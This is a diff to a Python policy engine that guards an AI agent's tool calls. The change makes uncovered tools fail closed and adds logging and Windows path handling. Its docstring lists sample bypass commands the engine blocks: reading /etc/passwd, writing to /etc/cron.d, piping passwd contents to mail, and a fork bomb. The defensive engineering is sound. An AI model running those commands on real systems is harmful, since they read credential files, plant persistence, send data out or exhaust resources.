@@ -1,7 +1,8 @@
-"""工具调用策略引擎：类 WAF 的白名单/黑名单 + 失败关闭（fail-closed）默认。
+"""工具调用策略引擎：类 WAF 的白名单/黑名单 + **默认拒绝（fail-closed）**。
 
 规则格式（YAML 或 Python dict）::
 
+    default_action: deny      # 顶层兜底：未覆盖的工具默认拒绝（可显式改成 allow）
     run_command:
       action: deny            # deny 表示默认拒绝，仅在命中 allow 时才放行
       allow:
@@ -21,8 +22,16 @@
         allowed_roots: ["/tmp"]
     web_search:
       action: allow           # allow 表示默认放行，仅在命中 deny 时拦截
+    "*":                      # 通配兜底规则：优先于 default_action，优先级低于精确工具名
+      action: allow
 
-语义校验解决了"前缀白名单绕过"类问题：
+Fail-closed（默认拒绝）的三层语义：
+1. **未覆盖的工具** → 按顶层 ``default_action`` 处置（默认 deny）：新增工具不会"默认裸奔"；
+2. **单条规则未显式声明 action** → 默认 deny：必须写 ``action: allow`` 才放行；
+3. **语义校验解析失败 / 无法判定** → deny。
+要放行某个工具，请显式写 ``action: allow``（内置策略里 web_search / receive_message 即如此）。
+
+语义校验解决的"前缀白名单绕过"类问题：
 - `cat /etc/passwd`（允许清单只匹配命令开头）→ 命令白名单+路径校验拦截；
 - `echo evil > /etc/cron.d/x`（echo 前缀 + 重定向写任意文件）→ shell 元字符拦截；
 - `cat /etc/passwd | mail x`（管道外发）→ shell 元字符拦截；
@@ -32,6 +41,7 @@
 from __future__ import annotations
 
 import copy
+import logging
 import os
 import re
 import shlex
@@ -40,15 +50,24 @@ from typing import Any
 from agent_shield.defenses.base import GuardRail, ToolCallDecision
 from agent_shield.defenses.sandbox import DANGEROUS_COMMAND_PATTERNS
 from agent_shield.models import ToolCall
+from agent_shield.observability import POLICY_DECISIONS, get_logger, log_event
 from agent_shield.paths import allowed_demo_roots
+
+logger = get_logger("defenses.policy_engine")
 
 # 危险的 shell 元字符：命令分隔/后台、管道、重定向、命令替换、变量展开、子 shell、
 # 花括号展开（fork bomb 如 :(){ :|:& };:）、多行、反斜杠转义
 _SHELL_METACHARS = set(";|&<>`$\n{}")
 
-# 默认策略：命令执行失败关闭（fail-closed），未覆盖工具默认放行
+# 顶层兜底动作的保留键（不会被当作工具名）与通配规则键
+DEFAULT_ACTION_KEY = "default_action"
+WILDCARD_RULE = "*"
+DEFAULT_ACTION = "deny"  # fail-closed：未覆盖的工具默认拒绝
+
+# 默认策略：命令执行失败关闭（fail-closed），未覆盖工具同样默认拒绝
 _DEMO_ROOTS = allowed_demo_roots()
-DEFAULT_POLICY: dict[str, dict[str, Any]] = {
+DEFAULT_POLICY: dict[str, Any] = {
+    DEFAULT_ACTION_KEY: DEFAULT_ACTION,
     "run_command": {
         "action": "deny",
         # 危险命令黑名单与沙箱共用（DANGEROUS_COMMAND_PATTERNS），防止规则漂移
@@ -72,6 +91,8 @@ DEFAULT_POLICY: dict[str, dict[str, Any]] = {
         "semantic": {"kind": "path", "allowed_roots": list(_DEMO_ROOTS)},
     },
     "web_search": {"action": "allow", "deny": []},
+    # 智能体间消息读取：允许调用，但其输出属不可信内容，交由注入检测器清洗
+    "receive_message": {"action": "allow", "deny": []},
     "send_email": {"action": "deny", "allow": [], "deny": []},
 }
 
@@ -80,13 +101,29 @@ class PolicyEngine(GuardRail):
     """按规则决策工具调用。规则可来自默认策略或外部 YAML。
 
     - 带 ``semantic`` 的规则走语义校验（整条命令解析 / 路径归一化）；
-    - 不带 ``semantic`` 的规则（自定义 YAML）回退到正则 allow/deny（向后兼容）。
+    - 不带 ``semantic`` 的规则（自定义 YAML）回退到正则 allow/deny（向后兼容）；
+    - **未覆盖的工具按 ``default_action`` 处置（默认 deny）**；``"*"`` 可作为通配兜底规则；
+    - 单条规则未写 ``action`` 时同样默认 deny（fail-closed）。
+
+    参数：
+        policy: 规则字典；缺省用 ``DEFAULT_POLICY``。
+        default_action: 显式指定兜底动作（覆盖 policy 里的 ``default_action``）。
     """
 
     name = "policy_engine"
 
-    def __init__(self, policy: dict[str, dict[str, Any]] | None = None):
-        self.policy = policy if policy is not None else copy.deepcopy(DEFAULT_POLICY)
+    def __init__(
+        self,
+        policy: dict[str, Any] | None = None,
+        default_action: str | None = None,
+    ):
+        raw = copy.deepcopy(policy) if policy is not None else copy.deepcopy(DEFAULT_POLICY)
+        declared = raw.pop(DEFAULT_ACTION_KEY, None)
+        action = str(default_action or declared or DEFAULT_ACTION).lower()
+        if action not in ("allow", "deny"):
+            raise ValueError(f"default_action 只能是 'allow' 或 'deny'，收到: {action!r}")
+        self.default_action = action
+        self.policy: dict[str, dict[str, Any]] = raw
 
     @classmethod
     def from_yaml(cls, path: str) -> PolicyEngine:
@@ -96,11 +133,33 @@ class PolicyEngine(GuardRail):
             return cls(yaml.safe_load(f))
 
     async def check_tool_call(self, call: ToolCall) -> ToolCallDecision:
-        spec = self.policy.get(call.name)
-        if spec is None:
-            # 未覆盖的工具：默认放行（策略显式覆盖危险工具）
-            return ToolCallDecision(allowed=True, reason="tool not covered by policy")
+        decision = self._decide(call)
+        POLICY_DECISIONS.inc(tool=call.name, decision="allowed" if decision.allowed else "blocked")
+        if not decision.allowed:
+            log_event(logger, "policy_denied", level=logging.DEBUG, tool=call.name, reason=decision.reason)
+        return decision
 
+    def _decide(self, call: ToolCall) -> ToolCallDecision:
+        spec = self.policy.get(call.name)
+        if spec is not None:
+            return self._check_rule(call, spec, tool_label=call.name)
+
+        wildcard = self.policy.get(WILDCARD_RULE)
+        if wildcard is not None:
+            return self._check_rule(call, wildcard, tool_label=WILDCARD_RULE)
+
+        # 未覆盖的工具：fail-closed（默认拒绝），只有显式 default_action: allow 才放行
+        if self.default_action == "allow":
+            return ToolCallDecision(
+                allowed=True, reason=f"tool {call.name!r} not covered by policy (default_action=allow)"
+            )
+        return ToolCallDecision(
+            allowed=False,
+            reason=f"denied by fail-closed default: tool {call.name!r} is not covered by policy",
+        )
+
+    def _check_rule(self, call: ToolCall, spec: dict[str, Any], *, tool_label: str) -> ToolCallDecision:
+        """按单条规则决策（正则 deny → 语义校验 → 正则 allow → action 兜底）。"""
         deny_patterns = spec.get("deny", [])
         argstr = " ".join(str(v) for v in call.arguments.values())
         for pat in deny_patterns:
@@ -112,13 +171,17 @@ class PolicyEngine(GuardRail):
 
         # 旧版正则 allow/deny（自定义 YAML 策略向后兼容）
         allow_patterns = spec.get("allow", [])
-        action = spec.get("action", "allow")
         for pat in allow_patterns:
             if re.search(pat, argstr):
                 return ToolCallDecision(allowed=True, reason=f"allowed by rule: {pat}")
-        if action == "deny":
-            return ToolCallDecision(allowed=False, reason="denied by fail-closed default")
-        return ToolCallDecision(allowed=True, reason="allowed by policy")
+        # 未显式声明 action 时同样 fail-closed（必须写 action: allow 才放行）
+        action = str(spec.get("action", "deny")).lower()
+        if action == "allow":
+            return ToolCallDecision(allowed=True, reason=f"allowed by policy for tool {tool_label!r}")
+        return ToolCallDecision(
+            allowed=False,
+            reason=f"denied by fail-closed default for tool {tool_label!r} (no allow rule matched)",
+        )
 
     # ------------------------------------------------------------------ #
     # 语义校验
@@ -146,8 +209,12 @@ class PolicyEngine(GuardRail):
                 )
 
         # 2) 整条命令解析：必须是简单 "cmd arg1 arg2 ..."（引号内参数允许）
+        #    Windows 注意：shlex(posix=True) 会把反斜杠当转义符，导致 `C:\dir\file`
+        #    被解析成 `C:dirfile` 而误判为"越界路径"。因此解析前先把路径分隔符统一为 "/"，
+        #    避免合法命令被误拦（该误报由良性对照集 tests/test_fp_benchmark.py 发现）。
+        parse_input = command.replace("\\", "/") if os.name == "nt" else command
         try:
-            tokens = shlex.split(command, posix=True)
+            tokens = shlex.split(parse_input, posix=True)
         except ValueError as exc:
             return ToolCallDecision(allowed=False, reason=f"denied by semantic policy: unparsable command ({exc})")
         if not tokens:
